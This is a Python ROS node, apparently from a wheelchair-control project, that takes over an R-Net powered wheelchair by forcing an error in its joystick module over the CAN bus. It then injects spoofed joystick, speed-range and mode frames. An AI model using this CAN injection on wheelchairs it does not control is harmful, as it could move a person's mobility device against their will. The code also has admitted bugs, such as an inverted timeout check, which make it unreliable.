#!/usr/bin/env python
# joystick based on: https://www.kernel.org/doc/Documentation/input/joystick-api.txt

import socket, sys, os, struct, array
from time import *
from fcntl import ioctl
import select
import threading
from can2RNET import *
import rospy
from wheelchair.msg import joy
from std_msgs.msg import String
from MessageArray import change_mode, change_mode_back

def dec2hex(dec,hexlen):  #convert dec to hex with leading 0s and no '0x'
    h=hex(int(dec))[2:]
    l=len(h)
    if h[l-1]=="L":
        l-=1  #strip the 'L' that python int sticks on
    if h[l-2]=="x":
        h= '0'+hex(int(dec))[1:]
    return ('0'*hexlen+h)[l:l+hexlen]

def send_joystick_canframe(s,joy_id):
        #packing data from joystick and sending it
        mintime = .01
        nexttime = time() + mintime
        priorjoyx=joyx
        priorjoyy=joyy
        while rnet_threads_running:
                joyframe = joy_id+'#'+dec2hex(joyx,2)+dec2hex(joyy,2)
                cansend(s,joyframe)
                nexttime += mintime
                t= time()
                if t < nexttime:
                    sleep(nexttime - t)
                else:
                    nexttime += mintime

def wait_joystickframe(cansocket,t): # won't work corrcetly, but will return correct frame id
    frameid = ''
    while frameid[0:3] != '020':
        #just look for joystick frame ID (no extended frame)
        msg = cansocket.recv()
        frameid = str(dec2hex(msg.arbitration_id,8))
        print(frameid)
        if t>time():
             print("JoyFrame wait timed out ")
             return('02000000')
    return(frameid)

def induce_JSM_error(cansocket):
    for i in range(0,3):
        cansend(cansocket,'0c000000#')

def RNET_JSMerror_exploit(cansocket):
        print("Waiting for JSM heartbeat")
        canwait(cansocket, "03C30F0F:1FFFFFFF")
        t=time()+0.20
        print("Waiting for joy frame")
        joy_id = wait_joystickframe(cansocket,t)
        print("Using joy frame: "+joy_id)
        induce_JSM_error(cansocket)
        print("3 x 0c000000# sent")
        return(joy_id)

def RNETsetSpeedRange(cansocket,speed_range):
        if speed_range>=0 and speed_range<=0x64:
            cansend(cansocket,'0a040100#'+dec2hex(speed_range,2))
        else:
            print('Invalid RNET SpeedRange: ' + str(speed_range))

def RNETshortBeep(cansocket):
        cansend(cansocket,"181c0100#0260000000000000")

def RNETplaysong(cansocket):
        cansend(cansocket,"181C0100#2056080010560858")
        sleep(.77)
        cansend(cansocket,"181C0100#105a205b00000000")

def watch_and_wait():
        while threading.active_count() > 0:
            sleep(0.5)
            print('X: ' + dec2hex(joyx,2) + '\tY: '+dec2hex(joyy,2))

def kill_rnet_threads():
    global rnet_threads_running
    rnet_threads_running = False

def callback_for_msg(msg):
    global joyx
    global joyy
    global cansocket
    global IsMode
    IsMode = True
    joyx = int(msg.x, 16) & 0xFF
    joyy = int(msg.y, 16) & 0xFF
    priorspeedrange = 0
    if msg.event[0].decode() == 's':
        speed_range = int(msg.event[2:], 16)
        if speed_range != priorspeedrange:
            print("received SpeedRange: " + str(speed_range))
            RNETsetSpeedRange(cansocket, speed_range)
            RNETshortBeep(cansocket)
            priorspeedrange = speed_range
    elif msg.event[0] == 'b':
        if msg.event[2:4] == 'h0':
            print ()
            #cansend(cansocket, "0C040101#")  #horn off
        if msg.event[2:4] == 'h1':
            if IsMode:
                print ("angle mode")
                cansendArr(cansocket, change_mode)
                IsMode = False
            else:
                print ("drive mode")

                cansendArr(cansocket, change_mode_back)
                IsMode = True

            #cansend(cansocket,"0C040100#")  #horn on
        if msg.event[2:4] == 'h2':
            cansendArr(cansocket, change_mode_back)



if __name__ == "__main__":

        node = rospy.init_node('PiNode')
        subscriber = rospy.Subscriber("/control_topic", joy, callback_for_msg)
        print ("node turned on")

        global rnet_threads_running
        rnet_threads_running = True
        global cansocket
        cansocket = opencansocket(0)
        if cansocket != '':

            #init /dev joystick
            global joyx
            global joyy
            joyx = 0
            joyy = 0

            joy_id = RNET_JSMerror_exploit(cansocket)
            playsongthread = threading.Thread(target=RNETplaysong,args=(cansocket,))

            speed_range = 00
            RNETsetSpeedRange(cansocket,speed_range)
            induce_JSM_error(cansocket)

            sendjoyframethread = threading.Thread(target=send_joystick_canframe,args=(cansocket,joy_id,))
            sendjoyframethread.start()
            #playsongthread.start()

            watch_and_wait()
            cansocket.shutdown()
        kill_rnet_threads()
        print("Exiting")

